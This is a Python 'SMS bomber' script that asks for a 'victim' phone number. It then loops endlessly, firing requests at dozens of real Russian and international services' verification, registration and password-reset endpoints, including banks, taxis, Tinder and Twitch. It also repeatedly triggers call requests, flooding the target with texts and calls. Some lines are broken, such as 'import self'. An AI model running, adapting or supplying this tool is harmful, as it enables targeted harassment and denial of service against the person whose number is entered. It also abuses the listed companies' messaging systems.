# coding=utf-8
import os
import random
import requests
import self as self

os.system("clear")
banner = """\033[33m
-------------------------------------------------
-         ***CREATED BY SPIRAL***               -
-                                               -
-      \033[37m  VK: https://vk.com/ftpg59gray\033[33m          -
-------------------------------------------------
"""
print(banner + '\033[0m')
num = input('Please, enter number of victim: 79......... ')

if num[0] == '+':
    num = num[1:]
if num[0] == '8':
    num = '7' + num[1:]
if num[0] == '9':
    num = '7' + num

name = ''
for x in range(12):
    name = name + random.choice(
        list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

phone9 = num[1:]
phoneAresBank = '+' + num[0] + '(' + num[1:4] + ')' + num[4:7] + '-' + num[7:9] + '-' + num[9:11]
phone9dostavista = phone9[:3] + '+' + num[3:6] + '-' + phone9[6:8] + '-' + phone9[8:10]
phoneOstin = '+' + num[0] + '+(' + num[1:4] + ')' + num[4:7] + '-' + num[7:9] + '-' + num[9:11]
phonePizzahut = '+' + num[0] + ' (' + num[1:4] + ') ' + num[4:7] + ' ' + num[7:9] + ' ' + num[9:11]
phoneGorzdrav = num[1:4] + ') ' + num[4:7] + '-' + num[7:9] + '-' + num[9:11]

iteration = 0
countSend = 0
countDoesntSend = 0
countCallsSend = 0
countCallsDoesntSend = 0
print('\033[0m ')
print(' ')
while True:
    _email = name + '{iteration}' + '@gmail.com'
    email = name + '{iteration}' + '@gmail.com'
    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': num, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('\033[F[+] Grab sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]
        print('\033[F[+] RuTaxi sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': num}, headers={})
        print('\033[F[+] BelkaCar sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': num},
                      headers={})
        print('\033[F[+] Tinder sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': num}, headers={})
        print('\033[F[+] Karusel sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + num}, headers={})
        print('\033[F[+] Tinkoff sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': num}, headers={})
        print('\033[F[+] MTS sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': num})
        print('\033[F[+] Youla sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': phonePizzahut, '_token': '*'})
        print('\033[F[+] PizzaHut sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': num})
        print('\033[F[+] Rabota sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + num})
        print('\033[F[+] Rutube sent!           ')
        countSend += 1
    except:
        print('\033[F-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + num + '/')
        print('\033[F[+] Citilink sent!           ')
        countSend += 1
    except:
        print('\033[F-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                      data={'name': name, 'phone': num, 'promo': 'yellowforma'})
        print('\033[F[+] Smsint sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.get(
            'https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('\033[F[+] Oyorooms sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!           ')
        countDoesntSend += 1

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp',
                      params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false',
                              'fromRegisterPage': 'true', 'snLogin': '', 'bpg': '', 'snProviderId': ''},
                      data={'phone': num, 'g-recaptcha-response': '', 'recaptcha': 'on'})
        print('\033[F[+] MVideo sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
            'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': num, 'typeKeys': ['Unemployed']}},
                                                          'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('\033[F[+] Newnext sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': num})
        print('\033[F[+] Sunlight sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={'client_type': 'personal', 'email': _email, 'mobile_phone': num, 'deliveryOption': 'sms'})
        print('\033[F[+] Alpari sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': num})
        print('\033[F[+] Invitro sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://online.sbis.ru/reg/service/',
                      json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                            'params': {'phone': num}, 'id': '1'})
        print('\033[F[+] Sberbank sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                      json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print('\033[F[+] Psbank sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': num})
        print('\033[F[+] Beltelcom sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': num})
        print('\033[F[+] Karusel sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + num})
        print('\033[F[+] KFC sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": num},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print('\033[F[+] Carsmile sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + num + '/')
        print('\033[F[+] Citilink sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",
                      data={"SignupForm[username]": num, "SignupForm[device_type]": 3})
        print('\033[F[+] Delitime sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": num}})
        print('\033[F[+] Guru sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': num, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r",
                            "r": "46763"})
        print('\033[F[+] ICQ sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + num, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print('\033[F[+] InDriver sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + num})
        print('\033[F[+] Invitro sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": num})
        print('\033[F[+] Pmsm sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": num})
        print('\033[F[+] IVI sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                      json={'phone': '+' + self.formatted_phone})
        print('\033[F[+] Lenta sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + num, "api": 2, "email": "email", "x-email": "x-email"})
        print('\033[F[+] Mail.ru sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": num, "recaptcha": 'off', "g-recaptcha-response": ""})
        print('\033[F[+] MVideo sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + num})
        print('\033[F[+] OK sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://plink.tech/register/', json={"phone": num})
        print('\033[F[+] Plink sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": num})
        print('\033[F[+] Qlean sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": num})
        print('\033[F[+] SMSgorod sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': num})
        print('\033[F[+] Tinder sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": num, "username": username})
        print('\033[F[+] Twitch sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': num}, headers={'App-ID': 'cabinet'})
        print('\033[F[+] CabWiFi sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": num, "type": 2})
        print('\033[F[+] Wowworks sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + num})
        print('\033[F[+] Eda.Yandex sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': num})
        print('\033[F[+] Youla sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": "{email}@gmail.ru", "mobile_phone": num,
                            "deliveryOption": "sms"})
        print('\033[F[+] Alpari sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": num})
        print('\033[F[+] SMS sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": num})
        print('\033[F[+] Delivery sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post("https://apteka366.ru/login/register/sms/send", data={"phone": num})
        print('\033[F[+] Apteka366 sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://api.fex.net/api/v1/auth/scaffold', data={"phone": num})
        print('\033[F[+] Fex sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('https://api.ennergiia.com/auth/api/development/lor', data={"phone": num})
        print('\033[F[+] Ennergiia sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.post('http://greadios.beget.tech/bomb.php', data={"number": num})
        print('\033[F[+] Greadios sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://www.stoloto.ru/send-mobile-app-link', data={"phone": num})
        print('\033[F[+] Stoloto sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont send!')
        countDoesntSend += 1

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + num})
        print('\033[F[+] Findclone call sent!           ')
        countCallsSend += 1
    except:
        print('\033[F[-] Dont send!')
        countCallsDoesntSend += 1

    try:
        requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": num})
        print('\033[F[+] Gorzdrav sent!           ')
        countSend += 1
    except:
        print('\033[F[-] Dont Send!')
        countDoesntSend += 1

    try:
        iteration += 1
        print(('{}  Iteraion passed.').format(iteration))
    except:
        break

print(str(countSend) + ' messages have been sent to ' + str(num))
print(str(countDoesntSend) + ' messages have not been send to ' + str(num))
print(str(countCallsSend) + ' calls have been sent to ' + str(num))
print(str(countCallsDoesntSend) + ' calls have not been send to')
